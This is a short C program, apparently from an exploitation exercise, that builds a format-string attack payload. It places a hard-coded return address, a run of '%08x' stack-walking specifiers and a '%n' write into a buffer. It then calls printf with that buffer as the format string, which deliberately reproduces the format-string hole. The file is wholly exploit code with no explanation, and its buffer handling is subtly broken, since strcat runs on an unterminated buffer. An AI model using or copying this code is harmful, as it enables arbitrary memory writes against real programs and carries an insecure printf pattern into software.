#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void pad(char *s) {
    int len = strlen(s);
    for (int i = len; i < 1000; i++) {
        s[i] = 'A';
    }
    s[1000] = '\0';
}

int main() {
    unsigned int ret_addr = 0xbffff333;
    char exploit[1001];
    
    // Incluir la direcciÃ³n de retorno en formato little-endian
    memcpy(exploit, &ret_addr, sizeof(ret_addr));

    for (int i = 0; i < 7; i++) {
        strcat(exploit, "%08x .");
    }

    strcat(exploit, "%n");

    pad(exploit);
    printf(exploit);
    return 0;
}

